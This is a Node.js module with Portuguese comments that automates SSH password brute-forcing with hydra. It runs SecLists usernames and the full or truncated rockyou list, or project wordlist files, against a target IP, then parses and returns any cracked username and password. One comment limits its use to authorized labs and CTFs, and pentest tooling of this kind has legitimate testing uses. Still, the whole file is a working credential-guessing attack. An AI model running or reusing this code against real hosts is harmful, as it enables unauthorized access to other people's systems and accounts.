import { readFile, writeFile, access, mkdtemp, rm } from 'fs/promises';
import { dirname, join } from 'path';
import { tmpdir } from 'os';
import { spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';

/** Caminhos padrão Kali/SecLists para fallback automático (hydra). */
export const SSH_HYDRA_AUTO_USERLIST =
  '/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt';
export const SSH_HYDRA_AUTO_PASSLIST_GZ = '/usr/share/wordlists/rockyou.txt.gz';
export const SSH_HYDRA_AUTO_PASSLIST_TXT = '/usr/share/wordlists/rockyou.txt';

function whichCmd(cmd) {
  return new Promise((resolve) => {
    const finder = process.platform === 'win32' ? 'where' : 'which';
    const p = spawn(finder, [cmd], { stdio: ['ignore', 'pipe', 'pipe'] });
    p.on('error', () => resolve(false));
    p.on('close', (c) => resolve(c === 0));
  });
}

function parseUsernames(raw, maxUsers = 3) {
  const list = String(raw || '')
    .split(/[\n,\s]+/)
    .map((s) => s.trim())
    .filter((s) => /^[a-zA-Z0-9._-]{1,32}$/.test(s));
  return [...new Set(list)].slice(0, maxUsers);
}

/** True se o utilizador preencheu users + caminho da wordlist para o subset manual. */
export function sshBruteManualReady(usernamesRaw = '', wordlistPath = '') {
  const users = parseUsernames(usernamesRaw, 3);
  const wl = String(wordlistPath || '').trim();
  return users.length > 0 && wl.length > 0;
}

async function fileReadable(p) {
  try {
    await access(p);
    return true;
  } catch {
    return false;
  }
}

function parseHydraOut(outText) {
  let loginMatch = outText.match(/login:\s*(\S+)\s+password:\s*(\S+)/i);
  if (!loginMatch) {
    loginMatch = outText.match(/\[ssh\][^\n]*\n[^\n]*login:\s*(\S+)[^\n]*password:\s*(\S+)/is);
  }
  if (!loginMatch) {
    loginMatch = outText.match(/host:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)/i);
  }
  return loginMatch;
}

/**
 * Hydra “automático”: SecLists usernames curtos + rockyou (gz ou txt).
 * Correr por último; pode demorar muito — usa timeout longo e -f (para ao primeiro hit).
 */
export async function runSshHydraBruteAutoFull({
  ip,
  port = 22,
  log,
  timeoutMs = 1_800_000,
  userListPath = SSH_HYDRA_AUTO_USERLIST,
  passListGz = SSH_HYDRA_AUTO_PASSLIST_GZ,
  passListTxt = SSH_HYDRA_AUTO_PASSLIST_TXT,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const hydraOk = await whichCmd('hydra');
  if (!hydraOk) {
    logger('SSH brute AUTO: hydra não está no PATH.', 'warn');
    return { ok: false, error: 'no-hydra', hydra: false };
  }

  const uPath = String(userListPath || '').trim();
  if (!(await fileReadable(uPath))) {
    logger(`SSH brute AUTO: ficheiro de users em falta — ${uPath}`, 'warn');
    return { ok: false, error: 'no-userlist-file', hydra: true };
  }

  let pPath = '';
  if (await fileReadable(passListGz)) pPath = passListGz;
  else if (await fileReadable(passListTxt)) pPath = passListTxt;
  else {
    logger(
      `SSH brute AUTO: rockyou em falta — tenta ${passListGz} ou ${passListTxt}`,
      'warn',
    );
    return { ok: false, error: 'no-passlist-file', hydra: true };
  }

  const timeoutMin = Math.max(1, Math.ceil(timeoutMs / 60_000));
  logger(
    `SSH brute AUTO: SecLists + rockyou completo — pode demorar muito (${timeoutMin} min máx. neste run; milhões de combinações possíveis).`,
    'warn',
  );
  logger(
    `SSH brute AUTO: hydra -L ${uPath} -P ${pPath} -t 2 -f -W 3 -s ${port} ssh://${ip}`,
    'warn',
  );

  const dir = await mkdtemp(join(tmpdir(), 'ghhydauto-'));
  const outFile = join(dir, 'hydra.out');
  const args = [
    '-L',
    uPath,
    '-P',
    pPath,
    '-s',
    String(port),
    '-t',
    '2',
    '-f',
    '-W',
    '3',
    '-o',
    outFile,
    `ssh://${ip}`,
  ];

  return await new Promise((resolve) => {
    const child = spawn('hydra', args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const errBuf = [];
    child.stderr.on('data', (d) => errBuf.push(d));
    const wall = setTimeout(() => {
      try {
        child.kill('SIGTERM');
      } catch {
        /* */
      }
    }, timeoutMs + 8000);
    child.on('error', async (e) => {
      clearTimeout(wall);
      await rm(dir, { recursive: true, force: true }).catch(() => {});
      resolve({ ok: false, error: e.message, hydra: true, mode: 'auto-full' });
    });
    child.on('close', async () => {
      clearTimeout(wall);
      let outText = '';
      try {
        outText = await readFile(outFile, 'utf8');
      } catch {
        /* */
      }
      const stderr = Buffer.concat(errBuf).toString('utf8').slice(0, 8000);
      await rm(dir, { recursive: true, force: true }).catch(() => {});

      const loginMatch = parseHydraOut(outText);
      if (loginMatch) {
        logger(`SSH brute AUTO: possível credencial — ${loginMatch[1]} / ${loginMatch[2]}`, 'success');
        resolve({
          ok: true,
          hydra: true,
          cracked: true,
          username: loginMatch[1],
          password: loginMatch[2],
          hydraSnippet: outText.slice(0, 4000),
          mode: 'auto-full',
          passListUsed: pPath,
        });
        return;
      }

      logger(
        `SSH brute AUTO: terminou sem credencial no tempo limite ou sem match — rever hydra (trecho): ${(outText + stderr).slice(0, 500)}`,
        'info',
      );
      resolve({
        ok: true,
        hydra: true,
        cracked: false,
        hydraSnippet: (outText + '\n' + stderr).slice(0, 6000),
        mode: 'auto-full',
        passListUsed: pPath,
      });
    });
  });
}

/**
 * Hydra contra SSH — limites rígidos (wordlist truncada, poucos utilizadores).
 * Só para labs autorizados / CTF.
 */
export async function runSshHydraBrute({
  ip,
  port = 22,
  usernamesRaw = '',
  wordlistPath = '',
  maxPasswords = 150,
  log,
  timeoutMs = 180000,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const users = parseUsernames(usernamesRaw, 3);
  if (!users.length) {
    logger('SSH brute: indica pelo menos um utilizador (ex.: root ou lb-test).', 'warn');
    return { ok: false, error: 'no-users', hydra: false };
  }

  const wl = String(wordlistPath || '').trim();
  if (!wl) {
    logger('SSH brute: indica caminho absoluto da wordlist (ex.: /usr/share/wordlists/rockyou.txt).', 'warn');
    return { ok: false, error: 'no-wordlist', hydra: false };
  }

  const hydraOk = await whichCmd('hydra');
  if (!hydraOk) {
    logger('SSH brute: hydra não está no PATH — instala hydra (ex.: apt install hydra).', 'warn');
    return { ok: false, error: 'no-hydra', hydra: false };
  }

  let content;
  try {
    content = await readFile(wl, 'utf8');
  } catch (e) {
    logger(`SSH brute: não consegui ler wordlist — ${e?.message || String(e)}`, 'warn');
    return { ok: false, error: 'read-wordlist', hydra: true };
  }

  const lines = content
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l.length > 0 && l.length <= 128);
  const slice = lines.slice(0, Math.min(maxPasswords, 500));
  if (!slice.length) {
    logger('SSH brute: wordlist vazia após filtro.', 'warn');
    return { ok: false, error: 'empty-wordlist', hydra: true };
  }

  const dir = await mkdtemp(join(tmpdir(), 'ghhyd-'));
  const passFile = join(dir, 'pass.txt');
  const userFile = join(dir, 'users.txt');
  await writeFile(passFile, `${slice.join('\n')}\n`, 'utf8');
  await writeFile(userFile, `${users.join('\n')}\n`, 'utf8');

  const timeoutSec = Math.max(30, Math.floor(timeoutMs / 1000));
  const args = [
    '-L',
    userFile,
    '-P',
    passFile,
    '-s',
    String(port),
    '-t',
    '2',
    '-f',
    '-W',
    '3',
    '-o',
    join(dir, 'hydra.out'),
    `ssh://${ip}`,
  ];

  logger(
    `SSH brute (hydra): ${users.length} user(s) × até ${slice.length} passwords · ${ip}:${port} (timeout ~${timeoutSec}s)`,
    'warn',
  );

  return await new Promise((resolve) => {
    const child = spawn('hydra', args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const errBuf = [];
    child.stderr.on('data', (d) => errBuf.push(d));
    const wall = setTimeout(() => {
      try {
        child.kill('SIGTERM');
      } catch {
        /* */
      }
    }, timeoutMs + 5000);
    child.on('error', async (e) => {
      clearTimeout(wall);
      await rm(dir, { recursive: true, force: true }).catch(() => {});
      resolve({ ok: false, error: e.message, hydra: true });
    });
    child.on('close', async () => {
      clearTimeout(wall);
      let outText = '';
      try {
        outText = await readFile(join(dir, 'hydra.out'), 'utf8');
      } catch {
        /* */
      }
      const stderr = Buffer.concat(errBuf).toString('utf8').slice(0, 8000);
      await rm(dir, { recursive: true, force: true }).catch(() => {});

      const loginMatch = parseHydraOut(outText);
      if (loginMatch) {
        logger(`SSH brute: possível credencial — ${loginMatch[1]} / ${loginMatch[2]}`, 'success');
        resolve({
          ok: true,
          hydra: true,
          cracked: true,
          username: loginMatch[1],
          password: loginMatch[2],
          hydraSnippet: outText.slice(0, 4000),
        });
        return;
      }

      if (/0\s+valid\s+password/i.test(outText) || /completed.*0\s+valid/i.test(stderr + outText)) {
        logger('SSH brute: hydra terminou — nenhuma password válida no subset.', 'info');
      } else {
        logger(`SSH brute: hydra exit — rever output (trecho): ${(outText + stderr).slice(0, 600)}`, 'info');
      }

      resolve({
        ok: true,
        hydra: true,
        cracked: false,
        hydraSnippet: (outText + '\n' + stderr).slice(0, 6000),
      });
    });
  });
}

/** Caminhos por defeito: `wordlists/usersolyd.txt` e `passwordsolyd.txt` na raiz do projeto. */
export function resolveSolydSshWordlistPaths() {
  const here = dirname(fileURLToPath(import.meta.url));
  const root = join(here, '..', '..');
  return {
    usersFile: join(root, 'wordlists', 'usersolyd.txt'),
    passwordsFile: join(root, 'wordlists', 'passwordsolyd.txt'),
  };
}

/**
 * Hydra com -L e -P em ficheiros no disco (wordlists completas, sem truncar).
 */
export async function runSshHydraBruteFromWordlistPair({
  ip,
  port = 22,
  userListPath,
  passListPath,
  log,
  timeoutMs = 300_000,
  logLabel = 'SSH brute (-L/-P)',
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const uPath = String(userListPath || '').trim();
  const pPath = String(passListPath || '').trim();
  if (!uPath || !pPath) {
    return { ok: false, error: 'missing-paths', hydra: false };
  }
  if (!(await fileReadable(uPath))) {
    logger(`${logLabel}: ficheiro de users em falta — ${uPath}`, 'warn');
    return { ok: false, error: 'no-userlist-file', hydra: true };
  }
  if (!(await fileReadable(pPath))) {
    logger(`${logLabel}: ficheiro de passwords em falta — ${pPath}`, 'warn');
    return { ok: false, error: 'no-passlist-file', hydra: true };
  }

  const hydraOk = await whichCmd('hydra');
  if (!hydraOk) {
    logger(`${logLabel}: hydra não está no PATH.`, 'warn');
    return { ok: false, error: 'no-hydra', hydra: false };
  }

  const timeoutSec = Math.max(30, Math.floor(timeoutMs / 1000));
  logger(
    `${logLabel}: hydra -L ${uPath} -P ${pPath} -t 2 -f -W 3 -s ${port} ssh://${ip} (timeout ~${timeoutSec}s)`,
    'warn',
  );

  const dir = await mkdtemp(join(tmpdir(), 'ghhydlp-'));
  const outFile = join(dir, 'hydra.out');
  const args = [
    '-L',
    uPath,
    '-P',
    pPath,
    '-s',
    String(port),
    '-t',
    '2',
    '-f',
    '-W',
    '3',
    '-o',
    outFile,
    `ssh://${ip}`,
  ];

  return await new Promise((resolve) => {
    const child = spawn('hydra', args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const errBuf = [];
    child.stderr.on('data', (d) => errBuf.push(d));
    const wall = setTimeout(() => {
      try {
        child.kill('SIGTERM');
      } catch {
        /* */
      }
    }, timeoutMs + 5000);
    child.on('error', async (e) => {
      clearTimeout(wall);
      await rm(dir, { recursive: true, force: true }).catch(() => {});
      resolve({ ok: false, error: e.message, hydra: true, mode: 'lp-files' });
    });
    child.on('close', async () => {
      clearTimeout(wall);
      let outText = '';
      try {
        outText = await readFile(outFile, 'utf8');
      } catch {
        /* */
      }
      const stderr = Buffer.concat(errBuf).toString('utf8').slice(0, 8000);
      await rm(dir, { recursive: true, force: true }).catch(() => {});

      const loginMatch = parseHydraOut(outText);
      if (loginMatch) {
        logger(`${logLabel}: possível credencial — ${loginMatch[1]} / ${loginMatch[2]}`, 'success');
        resolve({
          ok: true,
          hydra: true,
          cracked: true,
          username: loginMatch[1],
          password: loginMatch[2],
          hydraSnippet: outText.slice(0, 4000),
          mode: 'lp-files',
        });
        return;
      }

      logger(`${logLabel}: sem credencial no tempo limite ou hydra terminou — trecho: ${(outText + stderr).slice(0, 400)}`, 'info');
      resolve({
        ok: true,
        hydra: true,
        cracked: false,
        hydraSnippet: (outText + '\n' + stderr).slice(0, 6000),
        mode: 'lp-files',
      });
    });
  });
}
